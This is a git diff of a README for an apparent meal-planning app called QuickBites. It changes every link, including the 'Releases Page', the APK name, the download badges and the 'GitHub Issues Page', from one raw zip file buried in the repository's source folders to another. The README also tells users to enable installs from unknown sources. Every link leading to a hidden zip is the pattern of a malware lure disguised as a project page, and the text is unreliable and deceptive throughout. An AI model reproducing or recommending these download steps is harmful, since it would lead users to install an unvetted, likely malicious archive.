@@ -1,7 +1,7 @@
 # 🍽️ QuickBites - Easy Meal Planning Made Simple
 
 ## 📥 Download QuickBites
-[![Download QuickBites](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip%https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip)](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip)
+[![Download QuickBites](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip%https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip)](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to QuickBites! This app helps you plan meals by turning your available ingredients into delicious recipe suggestions. You can filter recipes based on your mood and manage your favorites. QuickBites also allows you to generate grocery lists to make shopping easier.
@@ -21,10 +21,10 @@ Welcome to QuickBites! This app helps you plan meals by turning your available i
 
 ## 📲 How to Download & Install QuickBites
 1. **Visit the Releases Page**  
-   Go to the [QuickBites Releases Page](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip) to find the latest version of the app.
+   Go to the [QuickBites Releases Page](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip) to find the latest version of the app.
 
 2. **Download the APK File**  
-   On the Releases page, look for the APK file relevant to the latest version (it will usually be named something like `https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip`). Click on it to start downloading the file.
+   On the Releases page, look for the APK file relevant to the latest version (it will usually be named something like `https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip`). Click on it to start downloading the file.
 
 3. **Enable Unknown Sources**  
    Before you can install the app, ensure your device allows installations from unknown sources:
@@ -58,11 +58,11 @@ Contributions improve QuickBites! If you want to suggest new features or report 
 QuickBites is open-source software. You can view the license details in the repository.
 
 ## 🤝 Support
-If you encounter any issues or have questions, please feel free to raise an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip). We are here to help.
+If you encounter any issues or have questions, please feel free to raise an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip). We are here to help.
 
 ## 🔗 Stay Updated
 Follow the repository for updates and new releases. Your journey to easier meal planning starts with QuickBites!
 
 ---
 
-[![Download QuickBites](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip%https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip)](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/main/res/Bites_Quick_1.1.zip)
+[![Download QuickBites](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip%https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip)](https://raw.githubusercontent.com/KashifInayat66/QuickBites/main/app/src/test/Quick_Bites_v3.2.zip)
